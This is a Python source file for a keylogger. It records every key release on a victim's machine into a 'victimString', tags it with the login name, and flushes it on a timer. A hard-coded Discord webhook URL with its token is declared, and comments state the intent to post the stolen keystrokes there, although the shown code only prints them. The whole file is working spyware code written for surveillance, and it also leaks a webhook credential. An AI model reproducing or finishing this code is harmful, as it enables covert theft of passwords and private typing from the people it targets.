import keyboard, os
import discord
from discord.ext import commands
from threading import Timer
from datetime import datetime

#will need to post directly to webhook since i want to run in thread
WEBHOOK = "https://discord.com/api/webhooks/828777990267338763/2tCn0R5OIniq2uNhPYmowWDuemiyi0iZKaVVmyN5aPCZMT_qvwjqtTQZJtMdeY4eKlNM"
INTER = 0.01

class Keylogger:
    def __init__(self, interval, method="discord"):
        self.INTERVAL = interval
        self.method = method
        self.victimString = ''
        self.victimName = os.getlogin()
        self.startTime = datetime.now().strftime('%d/%m/%Y %H:%M')
        self.endTime = datetime.now().strftime('%d/%m/%Y %H:%M')#placeholder time object

    def cleanPresses(self, event):
        """
        going to use this to clean up raw key input and add onto string
        """
        n = event.name
        if len(n) > 1:
            if n == "space":
                n = " "
            elif n == "decimal":
                n = '.'
            elif n == "enter":
                n = "[ENTER NEW LINE]\n"
        self.victimString += n

    def outputKeys(self):
        print(self.victimString)
        self.victimString = ''

    def startTimer(self):
        if self.victimString:
            self.outputKeys()
        timer = Timer(interval=self.INTERVAL, function=self.startTimer)
        timer.daemon = True
        timer.start()

    def mainLoop(self):
        keyboard.on_release(callback=self.cleanPresses)
        self.startTimer()
        keyboard.wait()#execute forever thread will close from discord controller eventually

if __name__ == '__main__':
    logger = Keylogger(interval=INTER)
    logger.mainLoop()
